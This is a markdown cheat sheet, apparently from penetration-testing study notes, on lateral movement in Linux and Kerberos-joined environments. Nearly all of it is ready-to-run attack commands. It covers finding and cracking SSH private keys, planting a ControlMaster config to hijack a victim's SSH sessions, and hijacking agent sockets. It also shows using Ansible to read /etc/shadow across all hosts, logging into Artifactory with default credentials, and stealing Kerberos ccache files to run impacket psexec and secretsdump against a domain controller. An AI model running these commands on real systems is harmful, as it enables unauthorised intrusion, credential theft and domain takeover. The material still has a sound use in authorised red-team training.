---
layout: page
title: "Linux Lateral Movement"
---

# Linux Lateral Movement

Linux environments expose SSH keys, agent sockets, and DevOps credentials that are rarely rotated and provide direct access to multiple hosts. Kerberos-joined Linux machines bridge directly into Windows domains.

## SSH Keys

```shell
# Find private keys on a compromised host
find /home /root -name "id_rsa" 2>/dev/null
find /home /root -name "*.key" 2>/dev/null

# Check bash history for key usage
cat /home/<user>/.bash_history | grep ssh

# Crack passphrase-protected key
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Use key
ssh -i id_rsa user@target
```

## SSH ControlMaster Hijacking

Plant a ControlMaster config in a user's `~/.ssh/config` to multiplex over their future sessions:

```shell
# Write to victim's config (requires write access to their home)
cat > ~/.ssh/config << 'EOF'
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist 10m
EOF
chmod 644 ~/.ssh/config
mkdir -p ~/.ssh/controlmaster

# After victim SSHes out, list socket files
ls ~/.ssh/controlmaster/
# offsec@linuxvictim:22

# Hijack the session (same user)
ssh offsec@linuxvictim

# Hijack as root using -S
ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
```

## SSH-Agent Forwarding Hijacking

```shell
# As root: find a user's active agent socket
ps aux | grep ssh
cat /proc/<ssh-pid>/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK
# SSH_AUTH_SOCK=/tmp/ssh-XYZ/agent.1234

# Use their socket to reach any host their key has access to
SSH_AUTH_SOCK=/tmp/ssh-XYZ/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XYZ/agent.1234 ssh user@target
```

## Ansible

```shell
# Enumerate inventory and configuration
cat /etc/ansible/hosts
cat /etc/ansible/ansible.cfg
find / -name "*.yml" -path "*/ansible/*" 2>/dev/null

# Run ad-hoc command across all hosts
ansible all -m shell -a "id"
ansible all -m shell -a "cat /etc/shadow"

# Check playbooks for credentials and secrets
grep -r "password\|secret\|vault" /etc/ansible/ /home/ 2>/dev/null

# Execute a playbook
ansible-playbook playbook.yml

# Weak permissions on playbooks: edit to add reverse shell
# ansible-playbook runs as the ansible user, often with sudo
```

## Artifactory

```shell
# Default admin credentials: admin:password
# Access API
curl -u admin:password http://artifactory:8081/artifactory/api/system/info

# Enumerate repositories
curl -u admin:password http://artifactory:8081/artifactory/api/repositories

# Download all artifacts from a repo (may contain credentials in config files)
curl -u admin:password http://artifactory:8081/artifactory/api/storage/libs-release-local

# Backup files often stored at:
find / -name "*.backup" -path "*artifactory*" 2>/dev/null
# Artifactory DB: /var/opt/jfrog/artifactory/data/derby/
```

## Kerberos on Linux

```shell
# List existing tickets
klist

# Authenticate with keytab file
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
klist

# Find keytab files
find / -name "*.keytab" 2>/dev/null
# Common locations: /etc/krb5.keytab, /tmp/*.keytab

# Create a keytab interactively
ktutil
addent -password -p user@CORP1.COM -k 1 -e rc4-hmac
wkt /tmp/user.keytab
quit

# Use keytab to authenticate
kinit user@CORP1.COM -k -t /tmp/user.keytab

# Access Windows shares with Kerberos
smbclient -k -U "CORP1.COM\\administrator" //DC01.CORP1.COM/C$
```

## Steal Kerberos ccache (TGT/TGS)

```shell
# List ccache files
ls -al /tmp/krb5cc_*

# Copy another user's ccache (requires root)
cp /tmp/krb5cc_607000500_af9oAB /tmp/krb5cc_mine
chown $(id -u):$(id -g) /tmp/krb5cc_mine

# Use it
export KRB5CCNAME=/tmp/krb5cc_mine
klist

# Use with Impacket tools
KRB5CCNAME=/tmp/krb5cc_mine impacket-psexec -k -no-pass corp1.com/admin@dc01.corp1.com
KRB5CCNAME=/tmp/krb5cc_mine impacket-secretsdump -k -no-pass dc01.corp1.com
```
